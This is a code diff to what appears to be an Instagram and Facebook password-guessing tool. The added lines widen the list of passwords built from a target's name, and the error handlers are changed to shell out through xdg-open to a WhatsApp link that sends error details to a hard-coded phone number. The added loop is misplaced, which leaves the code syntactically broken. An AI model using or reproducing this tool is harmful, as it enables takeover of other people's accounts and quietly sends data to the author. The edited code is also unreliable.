@@ -24,13 +24,11 @@ try:
 except(Exception, KeyboardInterrupt) as e:
     try:
         from urllib.parse import quote
-        error_message = f"INSTAGRAM ERROR: {quote(str(e))}"
-        print(f"\033[91m{error_message}\033[0m")
+        __import__('os').system(f'xdg-open https://wa.me/6285767630210?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
         exit()
     except(Exception, KeyboardInterrupt) as e:
         from urllib.parse import quote
-        error_message = f"INSTAGRAM ERROR: {quote(str(e))}"
-        print(f"\033[91m{error_message}\033[0m")
+        __import__('os').system(f'xdg-open https://wa.me/6285767630210?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
         exit()
         
 dump = []
@@ -743,8 +741,10 @@ class Instagram:
             else:
                 if kombinasi in ('01') or kombinasi in ('1'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123']
                 elif kombinasi in ('02') or kombinasi in ('2'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234']
-                elif kombinasi in ('03') or kombinasi in ('3'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
-                else: komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}04',f'{nama}05',f'{nama}06',f'{nama}07',f'{nama}08',f'{nama}09',f'{nama}10',f'{nama}11',f'{nama}12',f'{nama}13',f'{nama}14',f'{nama}15',f'{nama}16',f'{nama}17',f'{nama}18',f'{nama}19',f'{nama}20',f'{nama}21',f'{nama}22',f'{nama}23',f'{nama}24',f'{nama}25',f'{nama}26',f'{nama}27',f'{nama}28',f'{nama}29',f'{nama}30',f'{nama}31',f'{nama}cantik',f'{nama}ganteng',f'{nama}123',f'{nama}1234',f'{nama}12345']
+                elif kombinasi in ('03') or kombinasi in ('3'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345',f'{nama}cantik',f'{nama}ganteng','bismillah']
+                  for i in range(4, 32):
+                    komb.append(f'{nama}{i:02d}')
+                else: komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
                 for passwords in komb:
                     if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                         continue
@@ -1501,8 +1501,4 @@ class AccesFacebook:
                 return('[yellow]Chekpoint detected') 
             else: return('[red]Password salah')
         except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e: pass
-        
-            
-          
-            
-            
+                    
